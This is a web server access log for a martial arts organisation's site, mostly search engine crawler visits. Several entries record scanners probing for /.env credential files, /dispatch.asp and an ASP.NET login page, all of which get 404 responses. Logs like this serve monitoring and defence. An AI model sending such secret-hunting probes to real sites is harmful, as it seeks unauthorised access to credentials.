::ffff:66.249.65.172 - - [08/Apr/2023:15:45:30 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.168 - - [08/Apr/2023:15:45:31 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:185.254.196.173 - - [08/Apr/2023:15:50:20 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [08/Apr/2023:15:50:21 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:193.32.162.159 - - [08/Apr/2023:15:52:04 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:193.32.162.159 - - [08/Apr/2023:15:52:10 +0000] "GET /dispatch.asp HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:114.119.141.215 - - [08/Apr/2023:16:03:24 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:43.155.118.219 - - [08/Apr/2023:16:53:51 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:135.125.244.48 - - [08/Apr/2023:17:13:35 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [08/Apr/2023:17:13:36 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:47.136.205.89 - - [08/Apr/2023:17:26:08 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
::ffff:193.32.162.159 - - [08/Apr/2023:17:34:54 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:193.32.162.159 - - [08/Apr/2023:17:34:59 +0000] "GET /dispatch.asp HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:40.77.167.171 - - [08/Apr/2023:17:38:51 +0000] "GET /images/instructors/clarkb.jpeg HTTP/1.1" 200 12183 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:66.249.65.154 - - [08/Apr/2023:17:41:09 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.146 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.154 - - [08/Apr/2023:17:41:11 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "https://wadokikai.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.146 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
